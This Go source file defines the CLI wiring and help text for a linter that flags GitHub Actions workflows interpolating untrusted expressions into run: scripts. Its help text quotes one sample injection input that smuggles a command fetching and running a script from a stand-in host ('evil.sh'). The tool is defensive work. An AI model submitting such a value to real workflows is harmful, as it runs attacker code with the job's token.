package runinjection

// cobra_guard.go — the CLI surface for Run. Flag wiring and help text only.

import "github.com/spf13/cobra"

// Cmd is `llz ci workflow-injection`.
func Cmd() *cobra.Command {
	var root string
	c := &cobra.Command{
		Use:   "workflow-injection",
		Short: "fail when an externally-supplied expression is interpolated into a run: script",
		Long: "`${{ }}` is substituted into the script BEFORE the shell parses it, so an\n" +
			"interpolated value becomes SYNTAX rather than data. A workflow_dispatch input of\n" +
			"`v1\"; curl evil.sh | sh #` interpolated into a run: line executes the curl, with\n" +
			"whatever the job's token can reach.\n\n" +
			"Checks both this repo's workflows and instance-template's — the delivered ones\n" +
			"matter most, because an injection there is every adopter's. Flags what someone\n" +
			"outside this repo can set: `inputs.*` and `github.event.*` (whoever dispatches or\n" +
			"calls the workflow, and whoever opened the pull request), the branch-name\n" +
			"contexts, bare `github` for `toJSON(github)`, and `env.*` — which is the remedy's\n" +
			"own back door. A literal `matrix:` is safe; one built from an input is not.\n\n" +
			"The fix is always the same — move it to `env:`, where the shell expands it after\n" +
			"parsing and it cannot become syntax.\n\n" +
			"A SUPERSET OF actionlint, not a duplicate of it: measured, actionlint flags\n" +
			"its own untrusted-input list (github.head_ref, the event title/body fields) and\n" +
			"exits 0 on inputs.*, github.event.inputs.*, toJSON(github) and anything routed\n" +
			"through env: from one of those — which is the half every site found here was in.",
		Args: cobra.NoArgs,
		RunE: func(cmd *cobra.Command, _ []string) error {
			return Run(root, cmd.OutOrStdout(), cmd.ErrOrStderr())
		},
	}
	c.Flags().StringVar(&root, "root", ".", "repo root to scan")
	return c
}
